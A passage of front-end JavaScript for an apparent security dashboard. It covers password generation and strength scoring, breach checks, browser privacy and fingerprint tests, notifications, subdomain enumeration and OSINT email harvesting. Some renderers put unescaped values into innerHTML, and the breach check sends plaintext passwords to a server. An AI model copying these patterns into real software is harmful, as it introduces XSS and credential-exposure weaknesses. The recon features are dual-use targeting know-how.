  const br = document.getElementById('pwBreachResult');
  if (br) { br.textContent = ''; br.className = 'pw-breach-inline'; }

  // Add to history
  _pwHistory.unshift({ pw, mode: _pwMode, ts: Date.now() });
  if (_pwHistory.length > 20) _pwHistory.length = 20;
  _renderHistory();
}

// ── Strength engine ───────────────────────────────────────────────────────────
function _calcEntropy(pw) {
  let pool = 0;
  if (/[a-z]/.test(pw)) pool += 26;
  if (/[A-Z]/.test(pw)) pool += 26;
  if (/[0-9]/.test(pw)) pool += 10;
  if (/[^a-zA-Z0-9]/.test(pw)) pool += 32;
  return Math.round(pw.length * Math.log2(pool || 1));
}

const _CRACK_RATES = [
  [1e6,   '1M/s  (online attack)'],
  [1e9,   '1B/s  (offline, slow hash)'],
  [1e12,  '1T/s  (fast GPU)'],
];

function _crackTime(entropy) {
  const guesses = Math.pow(2, entropy - 1); // avg
  return _CRACK_RATES.map(([rate, label]) => {
    const secs = guesses / rate;
    return `${_humanTime(secs)} at ${label}`;
  });
}

function _humanTime(secs) {
  if (secs < 1)           return 'instantly';
  if (secs < 60)          return `${Math.round(secs)}s`;
  if (secs < 3600)        return `${Math.round(secs/60)}m`;
  if (secs < 86400)       return `${Math.round(secs/3600)}h`;
  if (secs < 31536000)    return `${Math.round(secs/86400)}d`;
  if (secs < 3.15e9)      return `${Math.round(secs/31536000)}y`;
  if (secs < 3.15e12)     return `${(secs/31536000/1000).toFixed(1)}K years`;
  if (secs < 3.15e15)     return `${(secs/31536000/1e6).toFixed(1)}M years`;
  return 'centuries';
}

function _strengthLabel(entropy) {
  if (entropy < 28) return ['Very Weak',  '#f04f59', 10];
  if (entropy < 40) return ['Weak',       '#f0853a', 30];
  if (entropy < 60) return ['Fair',       '#f0c03a', 52];
  if (entropy < 80) return ['Strong',     '#7c6af7', 74];
  if (entropy < 100)return ['Very Strong','#3dd68c', 88];
  return              ['Excellent',       '#3dd68c', 100];
}

function _renderStrength(pw, fillId, labelId, entropyId, crackId) {
  const ent = _calcEntropy(pw);
  const [label, colour, pct] = _strengthLabel(ent);
  const fill  = document.getElementById(fillId);
  const lbl   = document.getElementById(labelId);
  const entEl = document.getElementById(entropyId);
  const crk   = document.getElementById(crackId);
  if (fill)  { fill.style.width = pct + '%'; fill.style.background = colour; }
  if (lbl)   { lbl.textContent = label; lbl.style.color = colour; }
  if (entEl) entEl.textContent = `${ent} bits entropy`;
  if (crk)   crk.innerHTML = _crackTime(ent).map(t => `<div>${t}</div>`).join('');
}

// ── Copy ──────────────────────────────────────────────────────────────────────
async function pwCopy() {
  const pw = document.getElementById('pwOutput').textContent;
  if (!pw || pw === 'Click Generate') return;
  try {
    await navigator.clipboard.writeText(pw);
    const btn = document.getElementById('pwCopyBtn');
    btn.classList.add('copied');
    setTimeout(() => btn.classList.remove('copied'), 1500);
  } catch(e) { showToast('Copy failed — select and copy manually', 'warn'); }
}

// ── Breach check ──────────────────────────────────────────────────────────────
async function pwCheckBreach() {
  const pw  = document.getElementById('pwOutput').textContent;
  const res = document.getElementById('pwBreachResult');
  if (!pw || pw === 'Click Generate' || !res) return;

  res.textContent = '⏳ Checking…'; res.className = 'pw-breach-inline';
  try {
    const data = await api('/api/v1/breach-monitor/check-password', { method:'POST', json:{ password: pw } });
    if (data.pwned) {
      res.textContent = `⚠ Seen ${data.times.toLocaleString()}× — regenerate!`;
      res.className   = 'pw-breach-inline pwned';
    } else {
      res.textContent = '✓ Not in any breach';
      res.className   = 'pw-breach-inline safe';
    }
  } catch(e) { res.textContent = ''; }
}

// ── Bulk ──────────────────────────────────────────────────────────────────────
function pwBulkGenerate() {
  const count = parseInt(document.getElementById('pwBulkCount').value) || 5;
  const el    = document.getElementById('pwBulkList');
  if (!el) return;
  const passwords = Array.from({length: count}, () => {
    if (_pwMode === 'password')   return _genPassword();
    if (_pwMode === 'passphrase') return _genPassphrase();
    return _genPin();
  });
  el.innerHTML = passwords.map(p => `
    <div class="pw-bulk-item">
      <span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${p}</span>
      <button onclick="navigator.clipboard.writeText('${p.replace(/'/g,"\\'")}').then(()=>showToast('Copied','info'))">Copy</button>
    </div>`).join('');
}

async function pwBulkCopyAll() {
  const items = document.querySelectorAll('.pw-bulk-item span');
  if (!items.length) { showToast('Generate passwords first', 'warn'); return; }
  const all = Array.from(items).map(i => i.textContent.trim()).join('\n');
  try {
    await navigator.clipboard.writeText(all);
    showToast(`${items.length} passwords copied`, 'info');
  } catch(e) { showToast('Copy failed', 'warn'); }
}

// ── Analyzer ──────────────────────────────────────────────────────────────────
function pwAnalyzeInput(pw) {
  const el = document.getElementById('pwAnalyzeResult');
  if (!el) return;
  if (!pw) { el.innerHTML = ''; return; }

  const ent = _calcEntropy(pw);
  const [label, colour, pct] = _strengthLabel(ent);

  const checks = [
    ['Length ≥ 12',         pw.length >= 12],
    ['Length ≥ 16',         pw.length >= 16],
    ['Uppercase letters',   /[A-Z]/.test(pw)],
    ['Lowercase letters',   /[a-z]/.test(pw)],
    ['Numbers',             /[0-9]/.test(pw)],
    ['Special characters',  /[^a-zA-Z0-9]/.test(pw)],
    ['No repeated patterns',!/(.)\1{2,}/.test(pw)],
    ['Not all numbers',     !/^\d+$/.test(pw)],
  ];

  el.innerHTML = `
    <div class="pw-analyze-bar-wrap">
      <div class="pw-strength-track" style="margin-bottom:6px">
        <div class="pw-strength-fill" style="width:${pct}%;background:${colour}"></div>
      </div>
      <div style="display:flex;justify-content:space-between;font-size:12px;margin-bottom:10px">
        <span style="font-weight:700;color:${colour}">${label}</span>
        <span style="color:var(--text-3);font-family:monospace">${ent} bits</span>
      </div>
    </div>
    ${checks.map(([name, pass]) => `
      <div class="pw-analyze-row">
        <span>${name}</span>
        <strong style="color:${pass?'#3dd68c':'#f04f59'}">${pass?'✓':'✗'}</strong>
      </div>`).join('')}
    <div style="margin-top:10px">
      ${_crackTime(ent).map(t=>`<div style="font-size:11px;color:var(--text-3);margin-top:3px">${t}</div>`).join('')}
    </div>`;
}

function togglePwAnalyzeVis() {
  const inp = document.getElementById('pwAnalyzeInput');
  if (!inp) return;
  inp.type = inp.type === 'password' ? 'text' : 'password';
}

// ── History ───────────────────────────────────────────────────────────────────
function _renderHistory() {
  const el = document.getElementById('pwHistoryList');
  if (!el) return;
  if (!_pwHistory.length) {
    el.innerHTML = '<div style="font-size:13px;color:var(--text-3)">No passwords generated yet.</div>';
    return;
  }
  el.innerHTML = _pwHistory.map(h => {
    const ent  = h.mode === 'pin' ? 0 : _calcEntropy(h.pw);
    const [label, colour] = h.mode === 'pin' ? ['PIN', '#7c6af7'] : _strengthLabel(ent);
    return `<div class="pw-history-item">
      <span class="pw-hist-val">${h.pw}</span>
      <span class="pw-hist-sev" style="background:${colour}22;color:${colour}">${label}</span>
      <button onclick="navigator.clipboard.writeText('${h.pw.replace(/'/g,"\\'")}').then(()=>showToast('Copied','info'))">Copy</button>
    </div>`;
  }).join('');
}

function pwClearHistory() {
  _pwHistory = [];
  _renderHistory();
}

// ══════════════════════════════════════════════════════════════════════════════
// PRIVACY CHECK
// ══════════════════════════════════════════════════════════════════════════════

let _privacyRunning = false;

async function runPrivacyCheck() {
  if (_privacyRunning) return;
  _privacyRunning = true;

  const btn = document.getElementById('privacyRunBtn');
  if (btn) { btn.disabled = true; btn.textContent = 'Checking…'; }

  // Run server-side and client-side checks in parallel
  try {
    const [serverData] = await Promise.all([
      api('/api/v1/privacy/full'),
      _runWebRTCLeak(),
      _runBrowserFingerprint(),
    ]);
    _renderIpCard(serverData.ip  || {});
    _renderVpnCard(serverData.ip || {});
    _renderDnsCard(serverData.dns || {});
    _buildRecommendations(serverData.ip || {}, serverData.dns || {});
  } catch(e) {
    showToast('Privacy check failed: ' + e.message, 'error');
  } finally {
    _privacyRunning = false;
    if (btn) { btn.disabled = false; btn.textContent = 'Re-run Check'; }
  }
}

// ── IP card ───────────────────────────────────────────────────────────────────
function _renderIpCard(ip) {
  const display = document.getElementById('privIpDisplay');
  const meta    = document.getElementById('privIpMeta');
  const rows    = document.getElementById('privIpRows');
  const dot     = document.getElementById('privIpDot');

  if (!display) return;
  display.textContent = ip.ip || '—';

  const loc = [ip.city, ip.region, ip.country].filter(Boolean).join(', ');
  if (meta) meta.textContent = loc || 'Location unknown';

  if (dot) {
    dot.className = 'privacy-status-dot ' + (
      ip.is_proxy || ip.is_vpn_likely ? 'warn' :
      ip.threat_level === 'high'      ? 'danger' : 'safe'
    );
  }

  if (rows) rows.innerHTML = [
    ['ISP',       ip.isp       || '—'],
    ['ASN',       ip.asn       || '—'],
    ['Timezone',  ip.timezone  || '—'],
    ['Hosting IP',ip.is_hosting ? 'Yes' : 'No'],
    ['Mobile IP', ip.is_mobile  ? 'Yes' : 'No'],
  ].map(([k,v]) => `
    <div class="privacy-detail-row">
      <span class="privacy-detail-key">${k}</span>
      <span class="privacy-detail-val">${v}</span>
    </div>`).join('');
}

// ── VPN card ──────────────────────────────────────────────────────────────────
function _renderVpnCard(ip) {
  const el = document.getElementById('privVpnResult');
  if (!el) return;

  const checks = [
    {
      flag: ip.is_proxy,
      icon: ip.is_proxy ? '⚠️' : '✅',
      cls:  ip.is_proxy ? 'warn' : 'safe',
      title: ip.is_proxy ? 'Proxy / VPN detected' : 'No proxy detected',
      desc:  ip.is_proxy
        ? 'Your IP is flagged as a known proxy or VPN exit node.'
        : 'Your IP is not flagged as a known proxy.',
    },
    {
      flag: ip.is_hosting,
      icon: ip.is_hosting ? '⚠️' : '✅',
      cls:  ip.is_hosting ? 'warn' : 'safe',
      title: ip.is_hosting ? 'Datacenter / Hosting IP' : 'Residential IP',
      desc:  ip.is_hosting
        ? `Traffic appears to originate from a hosting provider (${ip.org || ip.isp || 'unknown'}).`
        : 'Your IP looks like a residential connection.',
    },
    {
      flag: ip.is_vpn_likely,
      icon: ip.is_vpn_likely ? '🔶' : '✅',
      cls:  ip.is_vpn_likely ? 'warn' : 'safe',
      title: ip.is_vpn_likely ? 'VPN provider organisation detected' : 'ISP name looks residential',
      desc:  ip.is_vpn_likely
        ? `Organisation "${ip.org || ip.isp}" matches known VPN provider patterns.`
        : 'No VPN provider name pattern found in your ISP/org.',
    },
  ];

  el.innerHTML = checks.map(c => `
    <div class="privacy-vpn-row ${c.cls}">
      <span class="privacy-vpn-icon">${c.icon}</span>
      <div class="privacy-vpn-text">
        <strong>${c.title}</strong>${c.desc}
      </div>
    </div>`).join('');
}

// ── WebRTC leak (client-side) ─────────────────────────────────────────────────
async function _runWebRTCLeak() {
  const el = document.getElementById('privWebrtcResult');
  if (!el) return;

  const ips = await _detectWebRTCIps();
  if (!ips.length) {
    el.innerHTML = '<div class="privacy-vpn-row safe"><span class="privacy-vpn-icon">✅</span><div class="privacy-vpn-text"><strong>No WebRTC leak detected</strong>WebRTC is disabled or returned no IPs.</div></div>';
    return;
  }

  const myPublicIp = document.getElementById('privIpDisplay')?.textContent || '';
  const leaks = ips.filter(i => !i.startsWith('192.168') && !i.startsWith('10.') && !i.startsWith('172.') && i !== '0.0.0.0' && i !== myPublicIp);

  let html = ips.map(ip => {
    const isLocal  = ip.startsWith('192.168') || ip.startsWith('10.') || ip.startsWith('172.') || ip.startsWith('169.254') || ip.startsWith('fc') || ip.startsWith('fd');
    const isLeak   = !isLocal && ip !== myPublicIp && ip !== '0.0.0.0';
    const tag      = isLocal ? 'local' : isLeak ? 'public' : 'vpn';
    const tagLabel = isLocal ? 'Local' : isLeak ? 'LEAKED' : 'VPN';
    return `<div class="privacy-webrtc-ip">
      <span>${ip}</span>
      <span class="privacy-webrtc-tag ${tag}">${tagLabel}</span>
    </div>`;
  }).join('');

  if (leaks.length) {
    html = `<div class="privacy-vpn-row danger" style="margin-bottom:8px">
      <span class="privacy-vpn-icon">🚨</span>
      <div class="privacy-vpn-text"><strong>WebRTC IP Leak Detected</strong>Your real IP may be exposed to websites even while using a VPN. Disable WebRTC in your browser settings.</div>
    </div>` + html;
  } else {
    html = `<div class="privacy-vpn-row safe" style="margin-bottom:8px">
      <span class="privacy-vpn-icon">✅</span>
      <div class="privacy-vpn-text"><strong>No WebRTC leak</strong>Only local/VPN IPs detected — your real IP is not exposed.</div>
    </div>` + html;
  }

  el.innerHTML = html;
}

function _detectWebRTCIps() {
  return new Promise(resolve => {
    const ips = new Set();
    let pc;
    try {
      pc = new RTCPeerConnection({ iceServers:[{ urls:'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('');
      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve([]));
      pc.onicecandidate = e => {
        if (!e.candidate) { pc.close(); resolve([...ips]); return; }
        const m = e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3}|[a-f0-9:]{2,})/gi);
        if (m) m.forEach(ip => ips.add(ip));
      };
      setTimeout(() => { try { pc.close(); } catch(_){} resolve([...ips]); }, 3000);
    } catch(e) { resolve([]); }
  });
}

// ── DNS card ──────────────────────────────────────────────────────────────────
function _renderDnsCard(dns) {
  const el = document.getElementById('privDnsResult');
  if (!el) return;

  const resolvers = dns.resolvers || [];
  if (!resolvers.length) {
    el.innerHTML = '<div class="privacy-pending">Could not identify DNS resolvers.</div>';
    return;
  }

  const scoreColour = s => s >= 80 ? '#3dd68c' : s >= 60 ? '#7c6af7' : s >= 40 ? '#f0853a' : '#f04f59';

  el.innerHTML = resolvers.map(r => `
    <div class="privacy-dns-row">
      <span class="privacy-dns-ip">${r.ip}</span>
      <span class="privacy-dns-label">${r.label || 'Unknown'}</span>
      <span class="privacy-dns-score" style="color:${scoreColour(r.privacy_score)}">${r.privacy_score}/100</span>
    </div>`).join('') +
    `<div class="privacy-dns-assessment">${dns.assessment || ''}</div>`;
}

// ── Browser fingerprint (client-side) ────────────────────────────────────────
async function _runBrowserFingerprint() {
  const el = document.getElementById('privFpResult');
  if (!el) return;

  const signals = [
    { label:'User Agent',        value: navigator.userAgent.slice(0, 80),   risk:'high',   why:'Unique browser/OS string' },
    { label:'Screen Resolution', value: `${screen.width}×${screen.height}`, risk:'medium', why:'Narrows device type' },
    { label:'Color Depth',       value: `${screen.colorDepth}-bit`,          risk:'low',    why:'Minor signal' },
    { label:'Timezone',          value: Intl.DateTimeFormat().resolvedOptions().timeZone, risk:'medium', why:'Reveals location region' },
    { label:'Language',          value: navigator.language || navigator.languages?.[0], risk:'low', why:'Regional identifier' },
    { label:'Platform',          value: navigator.platform || 'Unknown',     risk:'medium', why:'OS fingerprint' },
    { label:'CPU Cores',         value: navigator.hardwareConcurrency ?? '?', risk:'low',  why:'Device capability signal' },
    { label:'Cookies Enabled',   value: navigator.cookieEnabled ? 'Yes':'No', risk:'high', why:'Enables cross-site tracking' },
    { label:'Do Not Track',      value: navigator.doNotTrack === '1' ? 'Enabled' : 'Not set', risk: navigator.doNotTrack === '1' ? 'low':'high', why:'Privacy preference signal' },
    { label:'Touch Support',     value: ('ontouchstart' in window) ? 'Yes':'No', risk:'low', why:'Device type signal' },
  ];

  // Canvas fingerprint test (detect if canvas is available/unique)
  let canvasUnique = false;
  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Fp test 🎨', 2, 2);
    canvasUnique = c.toDataURL().length > 200;
  } catch(_) {}

  signals.push({
    label:'Canvas Fingerprint',
    value: canvasUnique ? 'Unique (trackable)' : 'Blocked',
    risk: canvasUnique ? 'high' : 'low',
    why: 'Highly unique cross-browser identifier',
  });

  // Entropy estimate: count high/medium/low signals
  const riskWeights = { high:3, medium:2, low:1 };
  const totalEntropy = signals.reduce((s,x) => s + (riskWeights[x.risk]||0), 0);
  const maxEntropy   = signals.length * 3;
  const fpScore      = Math.round((1 - totalEntropy / maxEntropy) * 100);
  const fpColour     = fpScore >= 70 ? '#3dd68c' : fpScore >= 45 ? '#f0853a' : '#f04f59';
  const fpLabel      = fpScore >= 70 ? 'Low exposure' : fpScore >= 45 ? 'Moderate exposure' : 'High exposure';

  el.innerHTML = `
    <div class="privacy-fp-score-bar" style="margin-bottom:16px">
      <div class="privacy-fp-score-lbl">
        <span style="font-weight:700;color:${fpColour}">${fpLabel}</span>
        <span style="color:var(--text-3)">Fingerprint score: ${fpScore}/100</span>
      </div>
      <div class="pw-strength-track">
        <div class="pw-strength-fill" style="width:${fpScore}%;background:${fpColour}"></div>
      </div>
    </div>
    <div class="privacy-fp-grid">
      ${signals.map(s => `
        <div class="privacy-fp-item">
          <div class="privacy-fp-label">${s.label}</div>
          <div class="privacy-fp-value">${s.value}</div>
          <span class="privacy-fp-risk ${s.risk}">${s.risk.toUpperCase()} · ${s.why}</span>
        </div>`).join('')}
    </div>`;
}

// ── Recommendations ───────────────────────────────────────────────────────────
function _buildRecommendations(ip, dns) {
  const card = document.getElementById('privRecsCard');
  const el   = document.getElementById('privRecs');
  if (!card || !el) return;

  const recs = [];

  if (ip.is_proxy || ip.is_vpn_likely) {
    recs.push({ icon:'✅', title:'VPN active — verify no leaks', desc:'You appear to be using a VPN. Run the WebRTC test to confirm your real IP is not leaking through the browser.' });
  } else {
    recs.push({ icon:'🔒', title:'Consider using a VPN', desc:'Your real IP is visible to every website you visit. A reputable VPN like Mullvad, ProtonVPN, or Windscribe can mask your location and ISP.' });
  }

  const avgDns = (dns.resolvers||[]).reduce((s,r)=>s+r.privacy_score,0) / ((dns.resolvers||[]).length||1);
  if (avgDns < 70) {
    recs.push({ icon:'🔍', title:'Switch to a privacy-respecting DNS resolver', desc:'Change your DNS to Cloudflare (1.1.1.1) or Quad9 (9.9.9.9). On Windows: Network settings → DNS. On router: LAN settings → DNS.' });
  }

  if (navigator.doNotTrack !== '1') {
    recs.push({ icon:'🚫', title:'Enable "Do Not Track" in your browser', desc:'While not legally enforceable, it signals your preference to websites. Settings → Privacy → Send "Do Not Track" request.' });
  }

  if ('ontouchstart' in window === false) {
    recs.push({ icon:'🛡️', title:'Consider a privacy-focused browser extension', desc:'uBlock Origin blocks trackers and ads. Privacy Badger learns to block invisible trackers as you browse. Both are free.' });
  }

  recs.push({ icon:'🍪', title:'Clear cookies and use private browsing', desc:'Cookies track you across sites. Use private/incognito mode for sensitive browsing, and clear cookies regularly.' });

  card.style.display = '';
  el.innerHTML = recs.map(r => `
    <div class="privacy-rec">
      <span class="privacy-rec-icon">${r.icon}</span>
      <div class="privacy-rec-body">
        <div class="privacy-rec-title">${r.title}</div>
        <div class="privacy-rec-desc">${r.desc}</div>
      </div>
    </div>`).join('');
}

// ══════════════════════════��═══════════════════════════���═══════════════════════
// NOTIFICATION CENTER
// ══════════════════════════════════════════════════════════════════════════════

let _notifAll       = [];
let _notifFilter    = 'all';
let _notifPollTimer = null;

// ── Icons per notification kind ────────────────────��──────────────────────────
const _NOTIF_ICONS = {
  domain_ssl:       '🔒',
  domain_whois:     '📋',
  domain_lookalike: '🎭',
  domain_dns:       '📡',
  breach_new:       '⚠️',
  breach_refresh:   '🔄',
  security_score:   '🏆',
  system:           'ℹ️',
};

// ── Bootstrap: start polling unread count when app loads ─────────────────────
function initNotifications() {
  refreshUnreadCount();
  // Poll unread count every 60s while app is open
  if (_notifPollTimer) clearInterval(_notifPollTimer);
  _notifPollTimer = setInterval(refreshUnreadCount, 60_000);
}

async function refreshUnreadCount() {
  try {
    const data = await api('/api/v1/notifications/unread-count');
    const count = data.count || 0;
    _updateBellBadge(count);
    _updateNavBadge(count);
  } catch(_) {}
}

function _updateBellBadge(count) {
  const badge = document.getElementById('notifBadge');
  const btn   = document.getElementById('notifBellBtn');
  if (!badge || !btn) return;
  if (count > 0) {
    badge.textContent  = count > 99 ? '99+' : count;
    badge.style.display = '';
    btn.classList.add('has-unread');
  } else {
    badge.style.display = 'none';
    btn.classList.remove('has-unread');
  }
}

function _updateNavBadge(count) {
  const badge = document.getElementById('navNotifBadge');
  if (!badge) return;
  if (count > 0) {
    badge.textContent   = count > 99 ? '99+' : count;
    badge.style.display = '';
  } else {
    badge.style.display = 'none';
  }
}

// ── Bell drawer ─────────────────────────────────────────────���─────────────────
async function toggleNotifDrawer() {
  const drawer = document.getElementById('notifDrawer');
  if (!drawer) return;
  if (drawer.style.display === 'none') {
    drawer.style.display = '';
    await _loadDrawerNotifications();
    // Close on outside click
    setTimeout(() => document.addEventListener('click', _closeDrawerOnOutsideClick, {once:true}), 50);
  } else {
    closeNotifDrawer();
  }
}

function closeNotifDrawer() {
  const drawer = document.getElementById('notifDrawer');
  if (drawer) drawer.style.display = 'none';
}

function _closeDrawerOnOutsideClick(e) {
  const wrap = document.getElementById('notifBellWrap');
  if (wrap && !wrap.contains(e.target)) closeNotifDrawer();
}

async function _loadDrawerNotifications() {
  const list = document.getElementById('notifDrawerList');
  if (!list) return;
  try {
    const items = await api('/api/v1/notifications?limit=10');
    if (!items.length) {
      list.innerHTML = '<div class="notif-empty">No notifications yet</div>';
      return;
    }
    list.innerHTML = items.map(n => _notifItemHTML(n, true)).join('');
  } catch(_) {
    list.innerHTML = '<div class="notif-empty">Failed to load</div>';
  }
}

// ── Full notifications page ──────────────────────────��────────────────────────
async function loadNotificationsPage() {
  const el = document.getElementById('notifPageList');
  if (!el) return;
  el.innerHTML = '<div class="loading-row">Loading notifications…</div>';
  try {
    _notifAll = await api('/api/v1/notifications?limit=100');
    _renderNotifPage();
  } catch(e) {
    el.innerHTML = `<div class="empty-state">Error: ${e.message}</div>`;
  }
}

function setNotifFilter(filter, btn) {
  _notifFilter = filter;
  document.querySelectorAll('.notif-filter').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  _renderNotifPage();
}

function _renderNotifPage() {
  const el = document.getElementById('notifPageList');
  if (!el) return;

  let items = _notifAll;
  if (_notifFilter === 'unread')           items = items.filter(n => !n.read);
  else if (_notifFilter === 'critical')    items = items.filter(n => n.severity === 'critical');
  else if (_notifFilter !== 'all')         items = items.filter(n => n.kind === _notifFilter);

  if (!items.length) {
    el.innerHTML = '<div class="glass-card" style="padding:32px;text-align:center;color:var(--text-3)">No notifications in this category</div>';
    return;
  }

  el.innerHTML = `<div class="glass-card" style="overflow:hidden">${items.map(n => _notifItemHTML(n, false)).join('')}</div>`;
}

function _notifItemHTML(n, compact) {
  const icon = _NOTIF_ICONS[n.kind] || 'ℹ️';
  const unreadClass = n.read ? '' : 'unread';
  const ago  = _timeAgo(n.created_at);
  const bodySnippet = compact ? '' : `<div class="notif-item-body-text">${n.body}</div>`;
  return `
    <div class="notif-item ${unreadClass}" onclick="onNotifClick('${n.id}','${n.action_url||''}')">
      <span class="notif-item-icon">${icon}</span>
      <div class="notif-item-body">
        <div class="notif-item-title">${n.title}</div>
        ${bodySnippet}
        <div class="notif-item-meta">
          <span class="notif-item-sev ${n.severity}">${n.severity}</span>
          <span class="notif-item-time">${ago}</span>
        </div>
      </div>
      ${n.action_label ? `<span class="notif-item-action">${n.action_label} →</span>` : ''}
    </div>`;
}

async function onNotifClick(id, actionUrl) {
  // Mark read
  try { await api(`/api/v1/notifications/${id}/read`, { method:'POST' }); } catch(_) {}
  // Update local state
  _notifAll = _notifAll.map(n => n.id === id ? {...n, read:true} : n);
  _renderNotifPage();
  refreshUnreadCount();
  // Navigate if action url set
  if (actionUrl) { navigateTo(actionUrl); closeNotifDrawer(); }
}

async function markAllNotificationsRead() {
  try {
    await api('/api/v1/notifications/read-all', { method:'POST' });
    _notifAll = _notifAll.map(n => ({...n, read:true}));
    _renderNotifPage();
    refreshUnreadCount();
    showToast('All notifications marked as read', 'info');
  } catch(e) { showToast(e.message, 'error'); }
}

async function triggerGuardianChecks() {
  const btn = document.querySelector('[onclick="triggerGuardianChecks()"]');
  if (btn) { btn.disabled = true; btn.textContent = 'Running…'; }
  try {
    await api('/api/v1/notifications/run-checks', { method:'POST' });
    showToast('Checks triggered — refreshing in 30s', 'info');
    setTimeout(async () => {
      await loadNotificationsPage();
      refreshUnreadCount();
    }, 30_000);
  } catch(e) { showToast(e.message, 'error'); }
  finally { if (btn) { btn.disabled=false; btn.textContent='Run Checks Now'; } }
}

// ── Time helper ────────────────────��─────────────────────��────────────────────
function _timeAgo(iso) {
  const diff = Date.now() - new Date(iso).getTime();
  const m = Math.floor(diff / 60_000);
  if (m < 1)   return 'just now';
  if (m < 60)  return `${m}m ago`;
  const h = Math.floor(m / 60);
  if (h < 24)  return `${h}h ago`;
  const d = Math.floor(h / 24);
  return `${d}d ago`;
}

// ── Hook into DOMContentLoaded (called from existing init) ────────────────────
document.addEventListener('DOMContentLoaded', () => {
  // Start polling after a short delay to let the app connect first
  setTimeout(initNotifications, 3000);
});


/* ═══════════════════════════════════════════════════════════════
   RECON: Subdomain enumeration
   ═══════════════════════════════════════════════════════════════ */

const _SUBDOMAIN_CACHE_KEY = 'xarex_subdomain_last';

function initSubdomainPage() {
  const input = document.getElementById('subdomainInput');
  if (input && !input._wired) {
    input._wired = true;
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') runSubdomainEnum();
    });
  }
  // Restore last result so users see something on page load
  try {
    const cached = localStorage.getItem(_SUBDOMAIN_CACHE_KEY);
    if (cached) renderSubdomainResult(JSON.parse(cached));
  } catch {}
}

async function runSubdomainEnum() {
  const input = document.getElementById('subdomainInput');
  const btn   = document.getElementById('subdomainRunBtn');
  const out   = document.getElementById('subdomainResult');
  const domain = (input?.value || '').trim();
  if (!domain) return;

  if (btn) { btn.disabled = true; btn.textContent = 'Searching…'; }
  if (out) out.innerHTML = '<div class="empty" style="padding:32px;text-align:center">Querying crt.sh, OTX, and HackerTarget in parallel — usually 5-20s.</div>';

  try {
    const data = await api('/api/v1/recon/subdomains', {
      method: 'POST',
      body: JSON.stringify({ domain, resolve: true, max_results: 500 }),
    });
    try { localStorage.setItem(_SUBDOMAIN_CACHE_KEY, JSON.stringify(data)); } catch {}
    renderSubdomainResult(data);
  } catch (e) {
    if (out) out.innerHTML = `<div class="empty" style="padding:32px;text-align:center;color:var(--critical)">Lookup failed: ${esc(e.message)}</div>`;
  } finally {
    if (btn) { btn.disabled = false; btn.textContent = 'Enumerate subdomains'; }
  }
}

function renderSubdomainResult(data) {
  const out = document.getElementById('subdomainResult');
  if (!out) return;
  if (!data || !data.subdomains?.length) {
    out.innerHTML = `<div class="empty" style="padding:32px;text-align:center">No subdomains found for <code>${esc(data?.domain || '')}</code>.</div>`;
    return;
  }
  const rows = data.subdomains.map(s => `
    <tr>
      <td><code>${esc(s.host)}</code></td>
      <td>${s.ip ? `<code>${esc(s.ip)}</code>` : '<span style="color:var(--text-3)">—</span>'}</td>
      <td>${s.sources.map(x => `<span class="sec-tab-badge" style="display:inline-block;margin-right:4px">${esc(x)}</span>`).join('')}</td>
    </tr>`).join('');
  out.innerHTML = `
    <div class="glass-card" style="margin-bottom:14px">
      <div class="card-header">
        <span>Discovered ${data.discovered} subdomain${data.discovered === 1 ? '' : 's'} for ${esc(data.domain)}</span>
        <span class="model-badge">Sources: ${data.sources_succeeded.join(', ') || 'none'}${data.sources_failed.length ? ' · failed: ' + data.sources_failed.join(', ') : ''}</span>
      </div>
      <table class="table" style="margin-top:8px">
        <thead><tr><th>Subdomain</th><th>IP</th><th>Sources</th></tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </div>`;
}


/* ═══════════════════════════════════════════════════════════════
   RECON: OSINT email harvesting
   ═══════════════════════════════════════════════════════════════ */

const _OSINT_EMAIL_CACHE_KEY = 'xarex_osint_email_last';

function initOsintEmailPage() {
  const input = document.getElementById('osintEmailInput');
  if (input && !input._wired) {
    input._wired = true;
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') runOsintEmailHarvest();
    });
  }
  try {
    const cached = localStorage.getItem(_OSINT_EMAIL_CACHE_KEY);
    if (cached) renderOsintEmailResult(JSON.parse(cached));
  } catch {}
}

async function runOsintEmailHarvest() {
  const input = document.getElementById('osintEmailInput');
  const btn   = document.getElementById('osintEmailRunBtn');
  const out   = document.getElementById('osintEmailResult');
  const domain = (input?.value || '').trim();
  if (!domain) return;

  if (btn) { btn.disabled = true; btn.textContent = 'Searching…'; }
  if (out) out.innerHTML = '<div class="empty" style="padding:32px;text-align:center">Pulling from crt.sh + PGP keyservers — usually 10-20s.</div>';

  try {
    const data = await api('/api/v1/recon/emails', {
      method: 'POST',
      body: JSON.stringify({ domain, check_breaches: true, max_results: 100 }),
    });
    try { localStorage.setItem(_OSINT_EMAIL_CACHE_KEY, JSON.stringify(data)); } catch {}
    renderOsintEmailResult(data);
  } catch (e) {
    if (out) out.innerHTML = `<div class="empty" style="padding:32px;text-align:center;color:var(--critical)">Lookup failed: ${esc(e.message)}</div>`;
  } finally {
    if (btn) { btn.disabled = false; btn.textContent = 'Harvest emails'; }
  }
}

function renderOsintEmailResult(data) {
  const out = document.getElementById('osintEmailResult');
  if (!out) return;
  if (!data || !data.emails?.length) {
    out.innerHTML = `<div class="empty" style="padding:32px;text-align:center">No publicly-indexed emails found for <code>${esc(data?.domain || '')}</code>.</div>`;
    return;
  }
  const rows = data.emails.map(e => {
    const breached = e.breached === true;
    const breachCell = breached
      ? `<span style="color:var(--critical);font-weight:600">⚠ ${e.breach_count} breach${e.breach_count === 1 ? '' : 'es'}</span>${e.breaches?.length ? '<br><span style="font-size:12px;color:var(--text-2)">' + e.breaches.slice(0,3).map(b => esc(b.name)).join(', ') + '</span>' : ''}`
      : e.breached === false
        ? '<span style="color:var(--success)">✓ clean</span>'
        : '<span style="color:var(--text-3)">—</span>';
    return `
    <tr>
      <td><code>${esc(e.email)}</code></td>
      <td>${e.sources.map(x => `<span class="sec-tab-badge" style="display:inline-block;margin-right:4px">${esc(x)}</span>`).join('')}</td>
      <td>${breachCell}</td>
    </tr>`;
  }).join('');
  const enrichmentNote = data.breach_enrichment
